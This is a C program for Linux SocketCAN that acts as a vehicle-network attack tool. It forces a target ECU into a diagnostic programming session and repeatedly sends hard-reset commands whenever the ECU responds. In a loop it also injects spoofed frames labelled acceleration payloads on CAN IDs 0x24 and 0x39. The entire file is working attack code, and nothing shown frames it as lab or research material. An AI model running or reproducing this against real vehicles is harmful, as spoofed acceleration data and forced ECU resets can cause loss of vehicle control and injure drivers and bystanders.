#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>
#include <time.h>

#define RX_CANID_OFFSET 0x008
#define SLEEP_TIME 100

// payloads array
unsigned char checkecupayload[3] = {0x02, 0x3e, 0x00};
unsigned char resetpayload1[3] = {0x02, 0x10, 0x02};
unsigned char resetpayload2[3] = {0x02, 0x11, 0x01};
unsigned char accelpayload1[8] = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12};
unsigned char accelpayload2[8] = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12};

// shared memory structure
typedef struct {
    int socket_fd;
    struct sockaddr_can addr;
    uint32_t ECUcan_id;
    unsigned int interval;
    pthread_mutex_t mutex;
} shared_data_t;

void send_can_frame(shared_data_t *data, struct can_frame *frame) {
    pthread_mutex_lock(&data->mutex);
    ssize_t nbytes = write(data->socket_fd, frame, sizeof(struct can_frame));
    if (nbytes != sizeof(struct can_frame)) {
        perror("Write fail");
    }
    pthread_mutex_unlock(&data->mutex);
}

//tx thread func
void* sender_thread(void* arg) {
    shared_data_t *data = (shared_data_t*)arg;
    struct can_frame frame;

    while (1) {
        //accelpayload1
        frame.can_id = 0x24;
        frame.can_dlc = 8;
        memcpy(frame.data, accelpayload1, 8);
        send_can_frame(data, &frame);

        //accelpayload2
        frame.can_id = 0x39;
        frame.can_dlc = 8;
        memcpy(frame.data, accelpayload2, 8);
        send_can_frame(data, &frame);

        if (data->interval == 0)
            break;

        usleep(data->interval * 10000); //into microseconds
    }

    pthread_exit(NULL);
}

//rx thread func
void* receiver_thread(void* arg) {
    shared_data_t *data = (shared_data_t*)arg;
    struct can_frame rx_frame;
    struct can_frame reset_frame;
    ssize_t nbytes;

    while (1) {
        pthread_mutex_lock(&data->mutex);
        nbytes = read(data->socket_fd, &rx_frame, sizeof(struct can_frame));
        pthread_mutex_unlock(&data->mutex);

        if (nbytes < 0) {
            perror("Read");
            continue;
        }

        //check if ECU sends live packets
        if (rx_frame.can_id == (data->ECUcan_id + RX_CANID_OFFSET) &&
            rx_frame.can_dlc == 3 &&
            rx_frame.data[0] == 0x02 &&
            rx_frame.data[1] == 0x7e &&
            rx_frame.data[2] == 0x00) {
            
            printf("ECU alive, trying rest ...\n");

            // resetpayload1
            reset_frame.can_id = data->ECUcan_id;
            reset_frame.can_dlc = 3;
            memcpy(reset_frame.data, resetpayload1, 3);
            send_can_frame(data, &reset_frame);

            // resetpayload2
            reset_frame.can_id = data->ECUcan_id;
            reset_frame.can_dlc = 3;
            memcpy(reset_frame.data, resetpayload2, 3);
            send_can_frame(data, &reset_frame);
        }
    }

    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 5 || strcmp(argv[3], "-diff") != 0) {
        printf("Usage: %s [can_interface] [ECUcanid] -diff [time_interval]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *interface = argv[1];
    uint32_t ECUcan_id = (uint32_t)strtol(argv[2], NULL, 16);
    unsigned int interval = atoi(argv[4]);

    int s;
    struct sockaddr_can addr;
    struct ifreq ifr;
    pthread_t sender_tid, receiver_tid;
    shared_data_t shared_data;
    int ret;

    // Initialize shared_data
    shared_data.ECUcan_id = ECUcan_id;
    shared_data.interval = interval;
    pthread_mutex_init(&shared_data.mutex, NULL);

    // Create CAN socket
    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0){
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0){
        perror("IOCTL failed");
        close(s);
        exit(EXIT_FAILURE);
    }

    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0){
        perror("Binding failed");
        close(s);
        exit(EXIT_FAILURE);
    }

    shared_data.socket_fd = s;
    shared_data.addr = addr;

    // Initialize variables for ECU reset check
    struct timespec start, current;
    struct can_frame frame, rx_frame;
    clock_gettime(CLOCK_MONOTONIC, &start);

    // Check if ECU is able to reset
    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &current);
        long elapsed = (current.tv_sec - start.tv_sec) * 1000000 + 
                       (current.tv_nsec - start.tv_nsec) / 1000;

        if (elapsed >= SLEEP_TIME) {
            fprintf(stderr, "ECU reset check timed out.\n");
            break;
        }

        // Send ECU diagnostic mode
        frame.can_id = shared_data.ECUcan_id;
        frame.can_dlc = 3;
        memcpy(frame.data, resetpayload1, 3);
        send_can_frame(&shared_data, &frame);

        // Get response
        while (1) {
            ssize_t nbytes = read(s, &rx_frame, sizeof(struct can_frame));
            if (nbytes > 0) {
                if (rx_frame.can_id == (shared_data.ECUcan_id + RX_CANID_OFFSET) &&
                    rx_frame.can_dlc == 3 &&
                    rx_frame.data[0] == 0x02 &&
                    rx_frame.data[1] == 0x50 &&
                    rx_frame.data[2] == 0x02) {
                    printf("ECU diagnostic mode active.\n");
                    goto ECU_RESET_DONE;
                }
            }

            clock_gettime(CLOCK_MONOTONIC, &current);
            if (((current.tv_sec - start.tv_sec) * 1000000 + 
                 (current.tv_nsec - start.tv_nsec) / 1000) >= SLEEP_TIME) {
                fprintf(stderr, "ECU diagnostic mode activation timed out.\n");
                break;
            }

            usleep(1000); // Sleep for 1 millisecond
        }
    }

ECU_RESET_DONE:

    // Initialize sender and receiver threads
    ret = pthread_create(&sender_tid, NULL, sender_thread, &shared_data);
    if (ret != 0) {
        fprintf(stderr, "Sender thread creation failed: %s\n", strerror(ret));
        close(s);
        exit(EXIT_FAILURE);
    }

    ret = pthread_create(&receiver_tid, NULL, receiver_thread, &shared_data);
    if (ret != 0) {
        fprintf(stderr, "Receiver thread creation failed: %s\n", strerror(ret));
        pthread_cancel(sender_tid);
        pthread_join(sender_tid, NULL);
        close(s);
        exit(EXIT_FAILURE);
    }

    // Wait for sender thread to finish
    pthread_join(sender_tid, NULL);

    // Cancel and join receiver thread
    pthread_cancel(receiver_tid);
    pthread_join(receiver_tid, NULL);

    // Cleanup
    pthread_mutex_destroy(&shared_data.mutex);
    close(s);
    return 0;
}
